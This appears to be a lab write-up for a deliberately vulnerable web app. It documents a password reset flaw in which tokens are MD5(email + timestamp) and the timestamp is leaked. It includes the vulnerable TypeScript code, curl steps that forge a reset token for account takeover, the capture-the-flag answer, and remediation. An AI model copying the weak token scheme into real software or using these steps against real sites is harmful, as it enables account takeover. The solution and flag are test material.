# Insecure Password Reset

## Overview

This vulnerability demonstrates a critical flaw in the password reset mechanism. The application uses a predictable token generation algorithm, allowing attackers to forge valid reset tokens for any user account, including administrators.

## Feature Description

The "Forgot Password" feature is accessible from the login page. It allows users to:

1. Enter their email address to request a password reset
2. Receive a reset link (simulated — the token is generated server-side)
3. Use the reset link to set a new password

This is a standard feature found in virtually every web application that supports email-based authentication.

## Vulnerability Summary

The vulnerability stems from the use of a weak, predictable token generation algorithm:

1. **Predictable Token Generation**: The reset token is computed as `MD5(email + unix_timestamp)`, using only two inputs that are both knowable by an attacker.

2. **Timestamp Disclosure**: The API response includes a `requestedAt` field containing the exact ISO timestamp of the request, which directly reveals the Unix timestamp used in token generation.

3. **No Rate Limiting**: Attackers can request unlimited password resets for any email address.

### Vulnerable Code

**Token Generation (app/api/auth/forgot-password/route.ts):**

```typescript
const now = new Date();
const requestedAt = now.toISOString();
const timestamp = Math.floor(now.getTime() / 1000);

const token = hashMD5(email + timestamp);

return NextResponse.json({
  message:
    "If an account with that email exists, a password reset link has been sent.",
  requestedAt, // Leaks the exact timestamp used in token generation
});
```

## Impact

This vulnerability allows attackers to:

- **Account Takeover**: Reset the password of any user account, including administrators
- **Privilege Escalation**: Gain admin access by resetting the admin password
- **No Email Access Required**: The attack doesn't require access to the victim's email inbox

## Exploitation

### How to Retrieve the Flag

To retrieve the flag `OSS{1ns3cur3_p4ssw0rd_r3s3t}`, follow these steps:

1. **Navigate to Forgot Password**: Go to `/login/forgot-password`
2. **Request a Reset**: Enter any existing user's email (e.g., `alice@example.com`) and submit the form
3. **Note the Timestamp**: The success response includes a `requestedAt` field — note this value
4. **Compute the Token**: Convert the `requestedAt` ISO string to a Unix timestamp (seconds), then compute `MD5(email + timestamp)`
5. **Use the Forged Token**: Navigate to `/login/reset-password?token=<computed_token>`
6. **Reset the Password**: Enter a new password — the flag is returned in the API response and displayed via the flag notification

### Example Using curl

```bash
# Step 1: Request password reset for any user
curl -X POST http://localhost:3000/api/auth/forgot-password \
  -H "Content-Type: application/json" \
  -d '{"email":"alice@example.com"}'
# Response: { "message": "...", "requestedAt": "2025-01-15T10:30:00.000Z" }

# Step 2: Compute the token
# Convert "2025-01-15T10:30:00.000Z" to Unix timestamp: 1736936400
# Compute: MD5("alice@example.com1736936400")
# Use any MD5 tool: echo -n "alice@example.com1736936400" | md5sum

# Step 3: Reset the password with the forged token
curl -X POST http://localhost:3000/api/auth/reset-password \
  -H "Content-Type: application/json" \
  -d '{"token":"<computed_md5_hash>","password":"newpassword123"}'
# Response includes the flag
```

## Remediation

### Immediate Actions

1. **Use Cryptographically Secure Tokens**: Generate tokens using a CSPRNG instead of derived values:

   ```typescript
   import crypto from "crypto";
   const token = crypto.randomBytes(32).toString("hex");
   ```

2. **Remove Timestamp from Response**: Don't leak timing information in API responses.

3. **Add Rate Limiting**: Limit password reset requests per email and per IP.

4. **Token Expiry**: Use short-lived tokens (15-30 minutes).

5. **Single Use**: Invalidate tokens after first use (already implemented).

## References

- [OWASP Forgot Password Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Forgot_Password_Cheat_Sheet.html)
- [CWE-640: Weak Password Recovery Mechanism for Forgotten Password](https://cwe.mitre.org/data/definitions/640.html)
- [CWE-330: Use of Insufficiently Random Values](https://cwe.mitre.org/data/definitions/330.html)
